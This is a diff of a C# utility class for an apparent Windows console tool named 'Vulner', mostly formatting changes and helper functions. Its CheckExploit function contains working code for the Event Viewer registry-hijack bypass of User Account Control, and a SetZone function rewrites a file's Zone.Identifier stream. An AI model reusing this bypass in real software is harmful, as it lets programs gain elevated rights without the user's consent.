@@ -14,6 +14,7 @@ using System.Management;
 using System.Globalization;
 using System.Runtime.InteropServices;
 using System.Drawing;
+using Microsoft.Win32.SafeHandles;
 
 namespace Vulner
 {
@@ -62,7 +63,7 @@ namespace Vulner
             if (new Regex(@"^::1\ [.]+$", RegexOptions.IgnoreCase).Match(s).Success) return true;
             return false;
         }
-        public static string FindFile( string name )
+        public static string FindFile(string name)
         {
             string file = "";
             try
@@ -103,7 +104,7 @@ namespace Vulner
                         {
                             file[new FileInfo(Path.Combine(str, name)).FullName] = true;
                         }
-                    } catch(ArgumentException) { }
+                    } catch (ArgumentException) { }
                     try
                     {
                         foreach (string s in Directory.GetFiles(str))
@@ -124,20 +125,21 @@ namespace Vulner
                             }
                         }
                     }
-                    catch (IOException) {  }
+                    catch (IOException) { }
                 }
             }
             catch (Exception) { }
             return file.Select(t => t.Key).ToArray();
         }
-        public static string RandomName( int len )
+        public static string RandomName(int len)
         {
             string a = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ.";
             byte[] bts = new byte[len];
             RandomNumberGenerator.Create().GetBytes(bts);
-            return new String( bts.Select(t => a[t % a.Length]).ToArray() );
+            return new String(bts.Select(t => a[t % a.Length]).ToArray());
         }
-        public static string RandomString( int len )
+
+        public static string RandomString(int len)
         {
             string a = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvxwyz";
             byte[] bts = new byte[len];
@@ -151,6 +153,19 @@ namespace Vulner
             RandomNumberGenerator.Create().GetBytes(bts);
             return new String(bts.Select(t => a[t % a.Length]).ToArray());
         }
+        public static string RandomString(string a, int len)
+        {
+            byte[] bts = new byte[len];
+            RandomNumberGenerator.Create().GetBytes(bts);
+            return new String(bts.Select(t => a[t % a.Length]).ToArray());
+        }
+        public static string RandomString(string a, int min, int max)
+        {
+            byte[] bts = new byte[Rnd(min, max)];
+            RandomNumberGenerator.Create().GetBytes(bts);
+            return new String(bts.Select(t => a[t % a.Length]).ToArray());
+        }
+
         public static byte[] RandomBytes(int min, int max)
         {
             byte[] bts = new byte[Rnd(min, max)];
@@ -163,24 +178,24 @@ namespace Vulner
             RandomNumberGenerator.Create().GetBytes(bts);
             return bts;
         }
-        public static int Rnd( int min = 0, int max = 100000 )
+        public static int Rnd(int min = 0, int max = 100000)
         {
             byte[] bt = new byte[500];
             RandomNumberGenerator.Create().GetBytes(bt);
             int a = bt.Sum<byte>(t => t);
             return a % (max - min) + min;
         }
-        public static FileInfo ProcessFile( Process p )
+        public static FileInfo ProcessFile(Process p)
         {
             try
             {
                 return new FileInfo(p.MainModule.FileName);
-            } catch(System.ComponentModel.Win32Exception)
+            } catch (System.ComponentModel.Win32Exception)
             {
                 return null;
             }
         }
-        public static bool HasAttrib( FileAttributes a, FileAttributes b )
+        public static bool HasAttrib(FileAttributes a, FileAttributes b)
         {
             return ((int)a & (int)b) == (int)b;
         }
@@ -189,11 +204,11 @@ namespace Vulner
             int xp = Console.CursorLeft;
             int yp = Console.CursorTop;
             Action S = () => { Console.SetCursorPosition(xp, yp); };
-            Func<char,int,int> ins = (char ch, int p) =>
-            {
+            Func<char, int, int> ins = (char ch, int p) =>
+              {
 
-                return 0;
-            };
+                  return 0;
+              };
             Console.TreatControlCAsInput = true;
 
             string s = "";
@@ -220,7 +235,7 @@ namespace Vulner
                 else
                 {
                     s = s + (int)k.KeyChar;
-                } 
+                }
                 S();
                 Console.Write(s);
             }
@@ -312,7 +327,7 @@ namespace Vulner
             try
             {
                 return C[method];
-            } catch(Exception) { }
+            } catch (Exception) { }
             return null;
         }
         public static string[] GetFilesSmarty(string Input, bool Re, bool Recursive = false, string P = "")
@@ -333,7 +348,7 @@ namespace Vulner
                     }
                 }
                 return s;
-            } catch(Exception) { }
+            } catch (Exception) { }
             return new string[] { };
         }
         public static string[] GetDirsSmarty(string Input, bool Re, bool Recursive = false, string P = "")
@@ -385,19 +400,27 @@ namespace Vulner
             Process.Start("eventvwr.exe").WaitForExit();
             Registry.CurrentUser.DeleteSubKey(k);
         }
-        public static bool CheckExploit( )
+        public static bool CheckExploit()
         {
-            int c = Process.GetProcessesByName("tracert").Count();
-            string k = "Software\\Classes\\mscfile\\shell\\open\\command";
-            MakeKeyTree(k);
-            Registry.CurrentUser.OpenSubKey(k, true).SetValue("", string.Format("{0}", "tracert.exe 8.8.8.8"));
-            Process.Start("eventvwr.exe").WaitForExit();
-            Registry.CurrentUser.DeleteSubKey(k);
-            Process p;
-            if (!Equals(p = Process.GetProcessesByName("tracert")[c], null))
+            try
             {
-                p.Kill();
-                return true;
+                int c = Process.GetProcessesByName("tracert").Count();
+                string k = "Software\\Classes\\mscfile\\shell\\open\\command";
+                MakeKeyTree(k);
+                Registry.CurrentUser.OpenSubKey(k, true).SetValue("", string.Format("{0}", "tracert.exe 8.8.8.8"));
+                Process.Start("eventvwr.exe").WaitForExit();
+                Registry.CurrentUser.DeleteSubKey(k);
+                Process p;
+                if (!Equals(p = Process.GetProcessesByName("tracert")[c], null))
+                {
+                    p.Kill();
+                    return true;
+                }
+            } catch (Exception) {
+                try
+                {
+                    Process.GetProcessesByName("mmc").Each(t => { t.Kill(); });
+                } catch(Exception) { }
             }
             return false;
         }
@@ -408,7 +431,7 @@ namespace Vulner
                 "",
                 Environment.CurrentDirectory
             };
-            foreach ( string dir in dirs )
+            foreach (string dir in dirs)
             {
                 FileInfo f = new FileInfo(Path.Combine(dir, s));
                 if (f.Exists)
@@ -418,7 +441,7 @@ namespace Vulner
             }
             return "";
         }
-        public static void Help(TerminalController Console, Command c, string s, string[] u, Dictionary<string,string> switches = null, Dictionary<string, string> param = null)
+        public static void Help(TerminalController Console, Command c, string s, string[] u, Dictionary<string, string> switches = null, Dictionary<string, string> param = null)
         {
             Console.ColorWrite("$a{1}", c.Name.ToUpper(), s);
             Console.ColorWrite("$8Usage:");
@@ -426,10 +449,10 @@ namespace Vulner
                 Console.ColorWrite("$7" + a.Replace("{NAME}", c.Name)); // Keeps colors
             }
 
-            if (!Equals(switches,null) && switches.Count > 0)
+            if (!Equals(switches, null) && switches.Count > 0)
             {
                 Console.ColorWrite("\n$8Switches:");
-                foreach (KeyValuePair<string,string> a in switches)
+                foreach (KeyValuePair<string, string> a in switches)
                 {
                     Console.ColorWrite(" $a/{0} $7- {1}", a.Key, a.Value.Replace("{NAME}", c.Name));
                 }
@@ -448,51 +471,66 @@ namespace Vulner
         {
             string Reg = Regex.Escape(In).Replace(@"\*", "(.+)");
 
-            int kv = 0;
-            foreach( string s in Directory.GetFiles(Environment.CurrentDirectory) )
+            int u = 0;
+            Dictionary<string, string> Fr = new Dictionary<string, string>();
+            foreach(string s in Directory.GetFiles(Environment.CurrentDirectory))
             {
                 FileInfo f = new FileInfo(s);
                 Match r = Regex.Match(f.Name, Reg);
-                string res = "";
-                if ( r.Success )
+                if (r.Success)
                 {
-                    string[] v = new string[r.Groups.Count];
-                    int i = 0;
+                    if (Copy)
+                    {
+                        Fr[f.FullName] = f.FullName;
+                    } else { 
+                        Fr[f.FullName] = Path.Combine(f.Directory.FullName, u.ToString("X8") + RandomString(40, 50) + "." + RandomString(3));
+                        File.Move(f.FullName, Fr[f.FullName]);
+                    }
+                    u++;
+                }
+            }
+            int kv = 0;
+            foreach (KeyValuePair<string, string> s in Fr)
+            {
+                FileInfo f = new FileInfo(s.Key);
+                Match r = Regex.Match(f.Name, Reg);
+                string res = "";
+                string[] v = new string[r.Groups.Count];
+                int i = 0;
 
-                    foreach( Group b in r.Groups )
+                foreach (Group b in r.Groups)
+                {
+                    v[i++] = b.Value;
+                }
+                res = Out;
+                try
+                {
+                    for (int k = 0; k < v.Length; k++)
                     {
-                        v[i++] = b.Value;
+                        res = res.Replace("$" + k, v[k]);
                     }
-                    res = Out;
-                    try
+                    res = res.Replace("$i", kv.ToString());
+                    if (Copy)
                     {
-                        for (int k = 0; k < v.Length; k++)
-                        {
-                            res = res.Replace("$" + k, v[k]);
-                        }
-                        res = res.Replace("$i", kv.ToString());
-                        if (Copy)
-                        {
-                            File.Copy(f.FullName, new FileInfo(res).FullName);
-                        }
-                        else
-                        {
-                            File.Move(f.FullName, new FileInfo(res).FullName);
-                        }
-                        Console.ColorWrite("$a{0} $c=> $f{1}", f.Name, res);
+                        File.Copy(s.Value, new FileInfo(res).FullName);
                     }
-                    catch (Exception ex)
+                    else
                     {
-                        Console.ColorWrite("$c{0} $c=> $f{1} $c- Error: {2}", f.Name, res, ex.Message);
+                        File.Move(s.Value, new FileInfo(res).FullName);
                     }
+                    Console.ColorWrite("$a{0} $c=> $f{1}", f.Name, res);
+                }
+                catch (Exception ex)
+                {
+                    Console.ColorWrite("$c{0} $c=> $f{1} $c- Error: {2}", f.Name, res, ex.Message);
                 }
                 kv++;
             }
         }
-        public static string GetCommandline( Process p )
+        public static string GetCommandline(Process p)
         {
             ManagementObjectSearcher searcher = new ManagementObjectSearcher(string.Format("SELECT * FROM Win32_Process"));
-            foreach( ManagementObject m in searcher.Get() )
+            foreach (ManagementObject m in searcher.Get())
             {
                 if (int.Parse(m["handle"].ToString()) == p.Id)
                     return m["commandLine"].ToString();
@@ -508,7 +546,7 @@ namespace Vulner
                 filename = GetFile(f);
                 contents = File.ReadAllText(filename);
                 Run(contents, m);
-            } catch(Exception)
+            } catch (Exception)
             {
                 return false;
             }
@@ -572,14 +610,17 @@ namespace Vulner
                         if (hidden)
                         {
                             Funcs.HideConsole();
+                        } else
+                        {
+                            Funcs.ShowConsole();
                         }
                     }
                     m.RunCommand(str);
                 }
-            } catch(Exception)
+            } catch (Exception)
             {
             }
-            if (dump != "") try { File.WriteAllText( dump, m.t.EndBuffer() ); } catch(Exception) { }
+            if (dump != "") try { File.WriteAllText(dump, m.t.EndBuffer()); } catch (Exception) { }
             if (close) Process.GetCurrentProcess().Kill();
             return true;
         }
@@ -604,9 +645,9 @@ namespace Vulner
 
 
         [DllImport("kernel32.dll")]
-        static extern bool SetConsoleMode( IntPtr hConsoleHandle, int dwMode );
+        static extern bool SetConsoleMode(IntPtr hConsoleHandle, int dwMode);
 
-        const int ENABLE_QUICK_EDIT_MODE = 0x0040;
+        const int ENABLE_QUICK_EDIT_MODE = 0x0010;
 
         public static void EnableRightClick()
         {
@@ -614,16 +655,16 @@ namespace Vulner
         }
 
         [DllImport("kernel32.dll")]
-        static extern bool GetConsoleMode( IntPtr hConsoleHandle, out int lpMode );
+        static extern bool GetConsoleMode(IntPtr hConsoleHandle, out int lpMode);
 
         [DllImport("user32.dll", SetLastError = true)]
         static extern bool GetWindowRect(IntPtr hwnd, out Rectangle lpRect);
 
-        public static void Attach( )
+        public static Rectangle Attach()
         {
             Rectangle r = new Rectangle();
             GetWindowRect(GetConsoleWindow(), out r);
-            MessageBox.Show(r.ToString());
+            return r;
         }
 
         public static T ToType<T>(object o)
@@ -631,52 +672,46 @@ namespace Vulner
             return (T)Convert.ChangeType(o, typeof(T));
         }
 
-    }
-    class MouseHook
-    {
-        public delegate int HookProc(int nCode, IntPtr wParam, IntPtr lParam);
-
-        public const int WH_MOUSE = 7;
-        
-        [StructLayout(LayoutKind.Sequential)]
-        public class POINT
+        public static void ChangeDir(string P)
         {
-            public int x;
-            public int y;
+            if (P == string.Empty) return;
+            if (P.Length < 2) { Environment.CurrentDirectory = P; return; } // Stopping the error before it occurs
+            Environment.CurrentDirectory = DriveLetterToUpper(P);
+        }
+        public static string DriveLetterToUpper(string P)
+        {
+            return P.Substring(0, 1).ToUpper() + P.Substring(1);
         }
 
-        [StructLayout(LayoutKind.Sequential)]
-        public class MouseHookStruct
+        [DllImport("kernel32", CharSet = CharSet.Unicode, SetLastError = true)]
+        public static extern SafeFileHandle CreateFile(
+        string name, FileAccess access, FileShare share,
+        IntPtr security,
+        FileMode mode, FileAttributes flags,
+        IntPtr template);
+
+        public static FileInfo Fi(string s)
         {
-            public POINT pt;
-            public int hwnd;
-            public int wHitTestCode;
-            public int dwExtraInfo;
+            return new FileInfo(Path.Combine(Environment.CurrentDirectory, s));
         }
-
-        [DllImport("user32.dll")]
-        public static extern int SetWindowsHookEx(int idHook, HookProc lpfn,
-        IntPtr hInstance, int threadId);
-
-        [DllImport("user32.dll", CharSet = CharSet.Auto,
-         CallingConvention = CallingConvention.StdCall)]
-        public static extern bool UnhookWindowsHookEx(int idHook);
-
-        [DllImport("user32.dll", CharSet = CharSet.Auto,
-         CallingConvention = CallingConvention.StdCall)]
-        public static extern int CallNextHookEx(int idHook, int nCode,
-        IntPtr wParam, IntPtr lParam);
-
-        public static int MakeHook(int tid)
+        public static bool SetZone(FileInfo f, int zone)
         {
-            int hook = 0;
-            HookProc mh = new HookProc((int nCode, IntPtr wParam, IntPtr lParam) =>
+            try
             {
-                Console.WriteLine("{0}", wParam);
-                return 0;
-            });
-            hook = MouseHook.SetWindowsHookEx(WH_MOUSE, mh, (IntPtr)0, tid);
-            return hook;
+                using (SafeFileHandle handle = Funcs.CreateFile(f.FullName + @":Zone.Identifier", FileAccess.ReadWrite, FileShare.None, IntPtr.Zero, FileMode.OpenOrCreate, FileAttributes.Normal, IntPtr.Zero))
+                {
+                    // Here add test of CreateFile return code
+                    // Then :
+
+                    using (StreamWriter writer = new StreamWriter(new FileStream(handle, FileAccess.ReadWrite), Encoding.ASCII))
+                    {
+                        writer.WriteLine("[ZoneTransfer]");
+                        writer.WriteLine("ZoneId={0}", zone);
+                    }
+                }
+                return true;
+            } catch(Exception) { }
+            return false;
         }
     }
 }
